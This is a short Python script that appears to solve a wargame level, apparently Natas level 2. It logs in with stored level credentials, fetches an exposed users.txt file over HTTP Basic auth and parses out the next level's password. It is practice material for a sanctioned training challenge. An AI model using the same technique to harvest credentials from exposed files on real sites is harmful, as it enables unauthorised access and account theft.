#!/usr/bin/env python3

import urllib.request
import base64
import re
from levels_credentials import credentials

level_url = credentials[2]["url"]
level_username = credentials[2]["level"]
level_password = credentials[2]["password"]
direct_url = level_url + "/files/users.txt"

next_level_username = credentials[3]["level"]

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))

req = urllib.request.Request(direct_url)
req.add_header("Authorization", "Basic %s" % auth_creds.decode("ascii"))

with urllib.request.urlopen(req) as response:
    data = response.read()
    strings = re.split('\n|:'.encode("ascii"), data)
    next_password = strings[strings.index(next_level_username.encode("ascii")) + 1]

print(next_password.decode("ascii"))
